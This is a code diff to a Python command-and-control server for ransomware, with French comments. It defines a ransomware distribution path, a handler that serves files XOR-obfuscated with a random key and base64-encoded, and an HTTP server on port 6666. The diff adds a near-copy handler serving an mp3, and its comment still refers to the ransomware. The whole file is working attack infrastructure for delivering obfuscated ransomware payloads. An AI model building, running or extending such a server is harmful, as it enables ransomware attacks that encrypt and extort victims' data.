@@ -10,6 +10,7 @@ class CNC(CNCBase):
     # Définir les chemins pour les dossiers racine du serveur CNC et du ransomware
     ROOT_PATH = "/root/CNC"
     RANSOMWARE_PATH = "/root/dist"
+    SONG_PATH = "/root/song"
 
     def get_ping(self, path: str, params: dict, body: dict) -> dict:
         # Fonction pour vérifier si le serveur est en ligne, renvoie un statut "OK"
@@ -69,6 +70,17 @@ class CNC(CNCBase):
             file = xor_crypt(f.read(), key)
             # Renvoie le fichier chiffré et la clé XOR sous forme de chaînes Base64
             return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}
+
+    def get_song(self, path: str, params: dict, body: dict) -> dict:
+        # Fonction pour récupérer le ransomware chiffré avec une clé XOR aléatoire
+        with open(os.path.join(self.SONG_PATH, "song.mp3"), "rb") as f:
+            # Génère une clé aléatoire pour l'obfuscation
+            key = os.urandom(32)
+            # Crypte le fichier avec la clé XOR aléatoire
+            file = xor_crypt(f.read(), key)
+            # Renvoie le fichier chiffré et la clé XOR sous forme de chaînes Base64
+            return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}
+
 
 # Crée et démarre le serveur HTTP sur le port 6666
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
